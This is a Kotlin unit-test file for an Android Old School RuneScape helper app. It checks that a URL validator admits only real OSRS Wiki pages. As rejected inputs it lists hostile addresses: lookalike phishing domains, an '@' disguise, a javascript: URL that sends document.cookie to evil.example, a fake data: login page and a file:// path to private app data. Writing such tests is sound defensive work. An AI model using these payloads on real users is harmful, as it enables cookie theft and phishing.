package com.sinat.osrsbubbletool

import org.junit.Assert.assertEquals
import org.junit.Assert.assertNull
import org.junit.Test

// Only real OSRS Wiki pages may open in the bubble's Wiki window: anything else another app sends is refused.
class WikiAddressTest {

    @Test
    fun aWikiPageIsAllowed() {
        assertEquals("https://oldschool.runescape.wiki/w/Zulrah", WikiAddress.safe("https://oldschool.runescape.wiki/w/Zulrah"))
    }

    @Test
    fun aPlainHttpWikiLinkIsMadeSecure() {
        assertEquals("https://oldschool.runescape.wiki/w/Zulrah", WikiAddress.safe("http://oldschool.runescape.wiki/w/Zulrah"))
    }

    @Test
    fun otherWebsitesAreRefused() {
        assertNull(WikiAddress.safe("https://evil.example/jagex-login"))
        assertNull(WikiAddress.safe("https://oldschool.runescape.wiki.evil.example/w/Zulrah"))
        assertNull(WikiAddress.safe("https://evil-oldschool.runescape.wiki.example/"))
    }

    @Test
    fun disguisedAddressesAreRefused() {
        // the part before @ is a user name: this really goes to evil.example
        assertNull(WikiAddress.safe("https://oldschool.runescape.wiki@evil.example/"))
        assertNull(WikiAddress.safe("https://oldschool.runescape.wiki:8443/w/Zulrah"))
    }

    @Test
    fun scriptsAndLocalPagesAreRefused() {
        assertNull(WikiAddress.safe("javascript:fetch('https://evil.example/?'+document.cookie)"))
        assertNull(WikiAddress.safe("data:text/html,<h1>Log in</h1>"))
        assertNull(WikiAddress.safe("file:///data/data/com.sinat.osrsbubbletool/shared_prefs/notes.xml"))
        assertNull(WikiAddress.safe("intent://oldschool.runescape.wiki/#Intent;scheme=https;end"))
    }

    @Test
    fun nonsenseIsRefused() {
        assertNull(WikiAddress.safe(""))
        assertNull(WikiAddress.safe("not a web address at all"))
    }
}
